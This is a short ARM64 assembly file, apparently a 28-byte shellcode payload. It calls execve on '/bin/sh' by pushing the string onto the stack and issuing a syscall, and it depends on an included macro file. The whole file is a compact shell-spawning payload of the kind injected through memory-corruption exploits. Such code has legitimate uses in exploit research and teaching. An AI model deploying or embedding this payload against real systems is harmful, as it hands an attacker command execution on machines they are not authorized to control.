// 28 bytes

    .arch armv8-a

    .include "include.inc"

    .global _start
    .text

_start:
    // execve("/bin/sh", NULL, NULL);
    mov    x8, SYS_execve
    mov    x2, xzr           // NULL
    mov    x1, xzr           // NULL
    movq   x3, BINSH         // "/bin/sh"
    str    x3, [sp, -16]!    // stores string on stack
    mov    x0, sp
    svc    0
